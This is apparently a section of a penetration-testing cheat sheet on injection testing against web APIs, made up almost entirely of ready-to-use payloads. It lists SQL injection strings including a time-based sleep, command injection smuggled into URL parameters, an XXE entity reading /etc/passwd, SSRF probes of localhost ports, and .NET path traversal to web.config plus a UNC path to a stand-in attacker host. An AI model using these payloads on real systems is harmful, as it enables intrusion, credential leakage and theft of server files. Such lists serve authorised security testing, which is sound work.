# Step 4: Injection Testing

**SQL Injection in JSON:**

```json
{"id":"56456"}                    → OK
{"id":"56456 AND 1=1#"}           → OK  
{"id":"56456 AND 1=2#"}           → OK
{"id":"56456 AND 1=3#"}           → ERROR (vulnerable!)
{"id":"56456 AND sleep(15)#"}     → SLEEP 15 SEC
```

**Command Injection:**

```bash
# Ruby on Rails
?url=Kernel#open → ?url=|ls

# Linux command injection
api.url.com/endpoint?name=file.txt;ls%20/
```

**XXE Injection:**

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

**SSRF via API:**

```html
<object data="http://127.0.0.1:8443"/>
<img src="http://127.0.0.1:445"/>
```

**.NET Path.Combine Vulnerability:**

```bash
# If .NET app uses Path.Combine(path_1, path_2)
# Test for path traversal
https://example.org/download?filename=a.png
https://example.org/download?filename=C:\inetpub\wwwroot\web.config
https://example.org/download?filename=\\smb.dns.attacker.com\a.png
```